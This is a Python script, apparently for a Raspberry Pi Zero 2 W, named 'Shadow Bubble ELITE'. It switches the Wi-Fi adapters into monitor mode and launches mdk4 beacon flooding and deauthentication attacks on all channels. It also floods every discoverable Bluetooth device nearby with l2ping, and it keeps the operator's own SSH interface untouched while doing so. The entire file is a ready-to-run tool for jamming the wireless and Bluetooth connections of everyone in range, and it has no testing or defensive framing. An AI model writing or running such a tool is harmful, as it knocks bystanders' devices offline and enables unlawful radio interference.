#!/usr/bin/env python3
# Shadow Bubble ELITE — Pi Zero 2 W Edition (Enhanced + SSH Protection)
import subprocess, signal, sys, time, curses, threading, os, re, shutil, psutil

SSID_COUNT = 64
HOP_INTERVAL = 8
DISPLAY_INTERVAL = 1
MAX_LOG = 50

activity_log = []
process_pids = []
selected_wifis = []
ssh_interface = None
stop_event = threading.Event()

# Run shell command
def run(cmd):
    return subprocess.getoutput(cmd)

# Logger
def log(msg):
    ts = time.strftime("[%H:%M:%S]")
    entry = f"{ts} {msg}"
    activity_log.append(entry)
    if len(activity_log) > MAX_LOG:
        activity_log.pop(0)

# Check if tool exists
def check_tool(name):
    if shutil.which(name) is None:
        log(f"[!] Missing: {name} — expected in PATH")
        return False
    return True

# SSH Protection
def detect_ssh():
    global ssh_interface
    out = run("who | grep ssh || true")
    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", out)
    if ips:
        ssh_ip = ips[0]
        route = run(f"ip route get {ssh_ip}")
        m = re.search(r"dev (\w+)", route)
        if m:
            ssh_interface = m.group(1)
            log(f"[+] SSH session detected on interface: {ssh_interface}")
        else:
            log("[!] SSH session detected but interface not resolved")
    else:
        log("[*] No active SSH session detected")

# Get WiFi & Bluetooth Adapters
def get_wifi_adapters():
    out = run("iw dev | grep Interface | awk '{print $2}'")
    return [a for a in out.split() if a]

def get_bt_adapters():
    out = run("hciconfig | grep '^hci' | awk '{print $1}'")
    return [b for b in out.split() if b.startswith("hci")]

# Enable monitor mode
def enable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
        subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
    except subprocess.CalledProcessError:
        subprocess.run(["sudo", "ifconfig", iface, "down"])
        subprocess.run(["sudo", "ifconfig", iface, "up"])
    out = run(f"iw dev {iface} info")
    if "monitor" in out:
        log(f"{iface} -> monitor mode confirmed")
        return True
    else:
        log(f"{iface} monitor mode FAILED")
        return False

# Attack Threads
def start_beacon(iface):
    if not check_tool("mdk4"): return
    cmd = f"sudo mdk4 {iface} b -s {SSID_COUNT // 4}"
    p = subprocess.Popen(cmd, shell=True)
    process_pids.append(p.pid)
    log(f"[B] Beacon started on {iface}")

def start_deauth(iface):
    if not check_tool("mdk4"): return
    cmd = f"sudo mdk4 {iface} d -c all -s 10"
    p = subprocess.Popen(cmd, shell=True)
    process_pids.append(p.pid)
    log(f"[D] Deauth started on {iface}")

def start_hopper(iface):
    chs = list(range(1, 14))
    idx = 0
    while not stop_event.is_set():
        ch = chs[idx % len(chs)]
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)], stdout=subprocess.DEVNULL)
        log(f"[H] {iface} channel -> {ch}")
        idx += 1
        time.sleep(HOP_INTERVAL)

def start_bt_jam(iface):
    if not check_tool("l2ping") or not check_tool("btmgmt"): return
    log(f"[BT] Flood started on {iface}")
    subprocess.run(f"sudo hciconfig {iface} up piscan", shell=True)
    while not stop_event.is_set():
        subprocess.run("sudo btmgmt find", shell=True)
        devs = run("hcitool scan | grep ':' | awk '{print $1}'").split()
        for d in devs:
            p = subprocess.Popen(f"sudo l2ping -i {iface} -s 128 -f {d}", shell=True)
            process_pids.append(p.pid)
        time.sleep(3)

# System Usage
def get_sys_stats():
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    return cpu, mem.percent

# Curses Display
def display_loop():
    try:
        stdscr = curses.initscr()
        curses.noecho()
        curses.cbreak()
        curses.start_color()
        curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)

        while not stop_event.is_set():
            stdscr.clear()
            h, w = stdscr.getmaxyx()
            cpu, mem = get_sys_stats()
            stdscr.addstr(0, 0, f"Shadow Bubble ELITE (CPU: {cpu:.1f}% | RAM: {mem:.1f}%)", curses.color_pair(3) | curses.A_BOLD)

            for i, entry in enumerate(activity_log[-(h - 3):]):
                color = curses.color_pair(1)
                if "[!]" in entry:
                    color = curses.color_pair(2)
                stdscr.addstr(i + 2, 0, entry[:w - 1], color)

            stdscr.refresh()
            time.sleep(DISPLAY_INTERVAL)
    except Exception as e:
        print("[!] Error starting curses display:", str(e))
        stop_event.set()
    finally:
        try:
            curses.echo()
            curses.nocbreak()
            curses.endwin()
        except:
            pass

# Cleanup
def cleanup(sig=None, frame=None):
    stop_event.set()
    log("[*] Cleanup initiated")
    for pid in process_pids:
        try:
            os.kill(pid, 9)
        except:
            pass
    print("[+] Shutdown complete")
    sys.exit(0)

# MAIN
if __name__ == '__main__':
    signal.signal(signal.SIGINT, cleanup)
    log("[*] Shadow Bubble ELITE initializing...")
    detect_ssh()
    wifs = [i for i in get_wifi_adapters() if i != ssh_interface]
    bts = get_bt_adapters()

    if not wifs:
        log("[-] No usable Wi-Fi adapters (all protected or unavailable)")
        time.sleep(2)
        cleanup()

    for iface in wifs:
        if enable_monitor(iface):
            selected_wifis.append(iface)
            threading.Thread(target=start_beacon, args=(iface,), daemon=True).start()
            threading.Thread(target=start_deauth, args=(iface,), daemon=True).start()
            threading.Thread(target=start_hopper, args=(iface,), daemon=True).start()

    if bts:
        threading.Thread(target=start_bt_jam, args=(bts[0],), daemon=True).start()
    else:
        log("[!] No valid Bluetooth adapter found")

    display_loop()
